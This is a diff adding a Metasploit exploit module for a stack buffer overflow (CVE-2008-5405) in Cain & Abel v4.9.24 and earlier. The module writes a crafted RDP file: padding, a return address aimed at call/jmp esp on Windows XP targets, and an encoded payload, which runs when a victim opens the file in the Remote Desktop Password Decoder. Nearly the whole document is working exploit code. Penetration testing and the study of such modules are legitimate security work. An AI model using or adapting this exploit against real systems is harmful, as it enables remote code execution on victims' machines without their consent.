@@ -1,0 +1,73 @@
+##
+# $Id: cain_abel_4918_rdp.rb 11127 2010-11-24 19:35:38Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = GoodRanking
+
+	include Msf::Exploit::FILEFORMAT
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Cain & Abel <= v4.9.24 RDP Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a stack-based buffer overflow in the Cain & Abel v4.9.24
+				and below. An attacker must send the file to victim, and the victim must open
+				the specially crafted RDP file under Tools -> Remote Desktop Password Decoder.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         => [ 'Trancek <trancek[at]yashira.org>' ],
+			'Version'        => '$Revision: 11127 $',
+			'References'     =>
+				[
+					[ 'CVE', '2008-5405' ],
+					[ 'OSVDB', '50342' ],
+					[ 'URL', 'http://www.milw0rm.com/exploits/7329' ],
+					[ 'BID', '32543' ],
+				],
+			'Payload'        =>
+				{
+					'Space'    => 800,
+					'BadChars' => "\x00\x0a\x0d\x3c\x22\x3e\x3d",
+					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
+					'StackAdjustment' => -3500,
+				},
+			'Platform' => 'win',
+			'Targets'        =>
+				[
+					# Tested ok patrickw 20090503
+					[ 'Windows XP SP2 English', 	{ 'Ret' => 0x7c82385d } ], #call esp
+					[ 'Windows XP SP0/1 English', 	{ 'Ret' => 0x71ab7bfb } ], #jmp esp
+					[ 'Windows XP SP2 Spanish',	{ 'Ret' => 0x7c951eed } ], #jmp esp
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => 'Nov 30 2008',
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				OptString.new('FILENAME', [ true, 'The file name.',  'exploit_cain.rdp']),
+			], self.class)
+	end
+
+	def exploit
+
+		filerdp = rand_text_alpha_upper(8206)
+		filerdp << [target.ret].pack('V') + [target.ret].pack('V')
+		filerdp << payload.encoded
+		print_status("Creating '#{datastore['FILENAME']}' file ...")
+
+		file_create(filerdp)
+
+	end
+
+end
